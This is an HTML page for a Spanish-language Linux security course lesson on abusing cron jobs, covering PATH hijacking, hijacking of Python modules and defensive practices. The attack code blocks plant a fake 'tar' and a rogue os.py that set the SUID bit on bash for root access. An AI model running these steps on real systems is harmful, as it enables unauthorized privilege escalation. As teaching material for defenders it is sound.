@@ -1,0 +1,259 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>51. Abusando de tareas Cron [3-3] | Introducción a Linux</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="../../css/styles.css" />
+    <style>
+      .lesson-content {
+        max-width: 800px;
+        margin: 2rem auto;
+        padding: 0 2rem 4rem;
+      }
+      .lesson-content h2 {
+        font-size: 1.5rem;
+        margin: 2rem 0 1rem;
+        color: var(--accent);
+      }
+      .lesson-content h3 {
+        font-size: 1.1rem;
+        margin: 1.5rem 0 0.5rem;
+        color: var(--text-1);
+      }
+      .lesson-content p {
+        color: var(--text-2);
+        margin-bottom: 1rem;
+        line-height: 1.8;
+      }
+      .lesson-content ul, .lesson-content ol {
+        color: var(--text-2);
+        margin-bottom: 1rem;
+        padding-left: 1.5rem;
+      }
+      .lesson-content li { margin-bottom: 0.4rem; }
+      .lesson-content .highlight {
+        background: var(--bg-card);
+        border-left: 3px solid var(--accent);
+        padding: 1rem 1.2rem;
+        border-radius: 0 8px 8px 0;
+        margin: 1rem 0;
+        font-size: 0.9rem;
+      }
+      .lesson-content .warning {
+        background: var(--bg-card);
+        border-left: 3px solid var(--red);
+        padding: 1rem 1.2rem;
+        border-radius: 0 8px 8px 0;
+        margin: 1rem 0;
+        font-size: 0.9rem;
+      }
+      .lesson-content code {
+        font-family: var(--mono);
+        background: var(--bg-hover);
+        padding: 0.1rem 0.4rem;
+        border-radius: 3px;
+        font-size: 0.85rem;
+        color: var(--accent);
+      }
+      .lesson-content pre {
+        background: var(--bg-card);
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        padding: 1rem 1.2rem;
+        margin: 1rem 0;
+        overflow-x: auto;
+      }
+      .lesson-content pre code {
+        background: none;
+        padding: 0;
+        color: var(--text-1);
+      }
+      .lesson-content .step {
+        background: var(--bg-card);
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        padding: 1rem 1.2rem;
+        margin: 0.8rem 0;
+      }
+      .lesson-content .step-num {
+        display: inline-block;
+        background: var(--accent);
+        color: #0a0c10;
+        font-weight: 700;
+        font-size: 0.75rem;
+        padding: 0.15rem 0.5rem;
+        border-radius: 4px;
+        margin-right: 0.5rem;
+        font-family: var(--mono);
+      }
+      .lesson-content table {
+        width: 100%;
+        border-collapse: collapse;
+        margin: 1rem 0;
+        font-size: 0.85rem;
+      }
+      .lesson-content th, .lesson-content td {
+        border: 1px solid var(--border);
+        padding: 0.6rem 0.8rem;
+        text-align: left;
+      }
+      .lesson-content th {
+        background: var(--bg-card);
+        color: var(--text-1);
+        font-weight: 600;
+      }
+      .lesson-content td { color: var(--text-2); }
+      .lesson-nav {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 3rem;
+        padding-top: 1.5rem;
+        border-top: 1px solid var(--border);
+      }
+      .lesson-nav a {
+        color: var(--accent);
+        text-decoration: none;
+        font-size: 0.9rem;
+        font-weight: 500;
+      }
+      .lesson-nav a:hover { text-decoration: underline; }
+      .back-link {
+        display: inline-flex;
+        align-items: center;
+        gap: 0.4rem;
+        color: var(--text-3);
+        text-decoration: none;
+        font-size: 0.85rem;
+        margin-bottom: 1rem;
+      }
+      .back-link:hover { color: var(--accent); }
+    </style>
+  </head>
+  <body>
+    <nav>
+      <a href="../../introduccion-a-linux.html" class="nav-logo">hack<span>4u</span></a>
+      <ul class="nav-links">
+        <li><a href="../../introduccion-a-linux.html">Cursos</a></li>
+        <li><a href="#">Roadmap</a></li>
+        <li><a href="#">Conócenos</a></li>
+      </ul>
+      <div class="nav-cta">
+        <button class="btn-ghost">Iniciar sesión</button>
+        <button class="btn-accent">Registrarse</button>
+      </div>
+    </nav>
+    <div style="background: var(--bg-deep); border-bottom: 1px solid var(--border);">
+      <div class="breadcrumb">
+        <a href="../../introduccion-a-linux.html">Inicio</a><span>›</span>
+        <a href="../../introduccion-a-linux.html">Cursos</a><span>›</span>
+        <a href="../../introduccion-a-linux.html">Introducción a Linux</a><span>›</span>
+        <span style="color: var(--text-2);">Clase 51</span>
+      </div>
+    </div>
+    <div class="lesson-content">
+      <a href="../../introduccion-a-linux.html" class="back-link">← Volver al curso</a>
+      <span class="course-tag">🐧 Linux · Ciberseguridad</span>
+      <h1 class="course-title" style="margin-bottom: 0.5rem;">Abusando de tareas Cron [3-3]</h1>
+      <div style="color: var(--text-3); font-size: 0.85rem; margin-bottom: 2rem;">Duración: 11:21 · Sección 2: Temario</div>
+
+      <p>En la ultima parte de esta serie exploramos tecnicas adicionales como PATH hijacking en Cron, explotacion de scripts con permisos de escritura global, abuso de scripts en Python/Perl con capabilities, y las mejores practicas de defensa.</p>
+
+      <h2>PATH hijacking en Cron</h2>
+      <p>Cuando un script Cron ejecuta un comando sin usar la ruta absoluta (ej: <code>tar</code> en lugar de <code>/bin/tar</code>), podemos manipular la variable <code>PATH</code> para que ejecute nuestro propio binario.</p>
+
+      <pre><code># Escenario: el crontab ejecuta "tar czf backup.tar.gz /data"
+# sin especificar la ruta completa de tar
+
+# 1. Verificar el crontab
+cat /etc/crontab
+# * * * * * root tar czf /tmp/backup.tar.gz /data/*
+
+# 2. Observar que PATH del crontab (primeras lineas)
+# PATH=/usr/local/bin:/usr/local/sbin:/usr/bin
+
+# 3. Crear un directorio escribible y poner nuestro tar falso
+mkdir -p /tmp/exploit
+echo '#!/bin/bash' > /tmp/exploit/tar
+echo 'cp /bin/bash /tmp/shell && chmod +s /tmp/shell' >> /tmp/exploit/tar
+chmod +x /tmp/exploit/tar
+
+# 4. Modificar PATH en el crontab (si tenemos permisos)
+# O esperar a que el script use un PATH que incluya /tmp/exploit
+export PATH=/tmp/exploit:$PATH
+
+# NOTA: El PATH de cron se define en /etc/crontab
+# Si podemos modificar /etc/crontab, anadimos:
+# PATH=/tmp/exploit:/usr/local/bin:/usr/bin</code></pre>
+
+      <div class="highlight">
+        <strong>PATH en /etc/crontab:</strong> Las primeras lineas de <code>/etc/crontab</code> definen variables de entorno como <code>PATH</code>, <code>SHELL</code> y <code>HOME</code>. Si puedes modificar este archivo, puedes redirigir cualquier comando. Verifica siempre los permisos de <code>/etc/crontab</code>: <code>ls -la /etc/crontab</code>.
+      </div>
+
+      <h2>Scripts con permisos de escritura global</h2>
+      <p>Los scripts en Python, Perl o cualquier otro lenguaje ejecutados por Cron con permisos de escritura global son vulnerables. Tambien los archivos <code>.pyc</code> o modulos importados.</p>
+
+      <pre><code># Buscar scripts ejecutados por cron con permisos debiles
+# 1. Identificar scripts en crontab
+grep -v '^#' /etc/crontab | grep -v '^$'
+
+# 2. Verificar permisos de cada script referenciado
+ls -la /path/to/script.sh
+
+# 3. Si es un script Python, ver los imports
+# El script hace: import os
+# Buscamos os.py en el PATH de Python
+find / -name "os.py" -writable 2>/dev/null
+
+# 4. Modificar el modulo para ejecutar codigo
+echo 'import os' > /tmp/os.py
+echo 'os.system("chmod +s /bin/bash")' >> /tmp/os.py
+# Si el modulo se encuentra antes que el real, se ejecuta nuestro codigo</code></pre>
+
+      <h2>Defensa: buenas practicas de Cron</h2>
+      <p>Para proteger un sistema contra explotacion de Cron, sigue estas recomendaciones:</p>
+
+      <pre><code># 1. Usar rutas absolutas SIEMPRE
+# Mal: tar czf backup.tar.gz /data
+# Bien: /bin/tar czf /tmp/backup.tar.gz /data
+
+# 2. Scripts dedicados (no comandos directamente en crontab)
+# Mal: * * * * * root tar czf /tmp/b.tgz /var/www
+# Bien: * * * * * root /usr/local/bin/backup.sh
+
+# 3. Permisos restrictivos en scripts
+chmod 700 /usr/local/bin/backup.sh
+chown root:root /usr/local/bin/backup.sh
+
+# 4. Usar -- para separar opciones de argumentos
+tar czf /tmp/backup.tar.gz -- /var/www/html/*
+
+# 5. Monitorear cambios en /etc/crontab y directorios cron
+auditctl -w /etc/crontab -p wa -k cron_changes
+
+# 6. Revisar logs periodicamente
+grep CRON /var/log/syslog | grep -i "error\|fail\|not found"</code></pre>
+
+      <div class="warning">
+        <strong>Resumen de la serie Cron:</strong> Las tareas Cron mal configuradas son uno de los vectores de escalada de privilegios mas comunes en Linux. Las tres tecnicas principales son: (1) scripts editables por el usuario, (2) wildcards en comandos como tar, y (3) PATH hijacking. La defensa se basa en usar rutas absolutas, permisos restrictivos y monitoreo de cambios.
+      </div>
+
+      <div class="lesson-nav">
+        <a href="clase-50.html">← Anterior: Abusando de tareas Cron [2-3]</a>
+        <a href="clase-52.html">Siguiente: Comprendiendo las expresiones de las tareas Cron →</a>
+      </div>
+    </div>
+    <footer>
+      <div class="footer-logo">hack4u</div>
+      <div class="footer-links">
+        <a href="#">Aviso Legal</a>
+        <a href="#">Politica de Cookies</a>
+        <a href="#">Privacidad</a>
+        <a href="#">Terminos y Condiciones</a>
+      </div>
+      <div>© 2026 hack4u.io — Todos los derechos reservados.</div>
+    </footer>
+  </body>
+</html>
